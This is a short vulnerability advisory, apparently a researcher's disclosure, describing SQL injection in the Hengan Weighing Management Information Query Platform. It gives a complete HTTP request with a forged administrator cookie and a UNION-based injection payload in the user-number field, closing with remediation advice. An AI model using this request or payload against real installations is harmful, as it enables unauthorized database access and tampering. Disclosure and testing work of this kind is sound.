# Hengan Weighing Management Information Query Platform SQL Injection  

## vulnerability Abstractty Abstract

There is one SQL Injection  vulnerability in Hengan Weighing Management Information Query Platform,which can be exploited by attackers to get database's sensitive information and obtain system permissions.



## Scope of influence

All versions



## vulnerability Reappearance

It shows like this.

![image-20240417153656847](https://gitee.com/yuejinjianke/tuchuang/raw/master/image/image-20240417153656847.png)





![image-20240417153639397](https://gitee.com/yuejinjianke/tuchuang/raw/master/image/image-20240417153639397.png)



You can also forge cookie information and send the following data packet.

```
POST /%E7%94%A8%E6%88%B7%E7%AE%A1%E7%90%86/search_user.aspx HTTP/1.1
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Cookie: ASP.NET_SessionId=1; AdminInfo=username=1;
     __EVENTTARGET=&__EVENTARGUMENT=&__LASTFOCUS=&__VIEWSTATE=&tuser_Number=1' UNION ALL SELECT NULL,NULL,NULL,sys.fn_sqlvarbasetostr(HASHBYTES('MD5','{{random_str}}')),NULL--&tb_query=+&ListBox1=%E6%9D%A8%E9%87%91%E9%9D%A9&TextName=%E6%9D%A8%E9%87%91%E9%9D%A9&TextPassword=******&CheckBox02=on&CheckBox03=on&CheckBox019=on&CheckBox020=on&CheckBox025=on&CheckBox36=on&cbx_1=on&cbx_11=on&cbx_21=on&cbx_33=on&cbx_2=on&cbx_12=on&cbx_22=on&cbx_42=on&cbx_3=on&cbx_13=on&cbx_23=on&cbx_35=on&cbx_4=on&cbx_32=on&cbx_5=on&cbx_15=on&cbx_25=on&cbx_26=on&cbx_17=on&cbx_27=on&cbx_41=on&cbx_8=on&cbx_18=on&cbx_39=on&cbx_19=on&cbx_10=on&cbx_20=on&cbx_30=on&hfdj=
```

payload is as follow:

```
1' UNION ALL SELECT NULL,NULL,NULL,sys.fn_sqlvarbasetostr(HASHBYTES('MD5','12345'))-- wbRV
```

If the echo contains the desired MD5 hash value, then there is a vulnerability.



A malicious attacker can exploit this vulnerability to execute malicious  injection statements to obtain sensitive data or tamper with the database.





suggetsion: Prevent SQL injection attacks by updating to the latest version, using

   parameterized queries or precompiled statements and filtering and validating

   input.





yueji0j1anke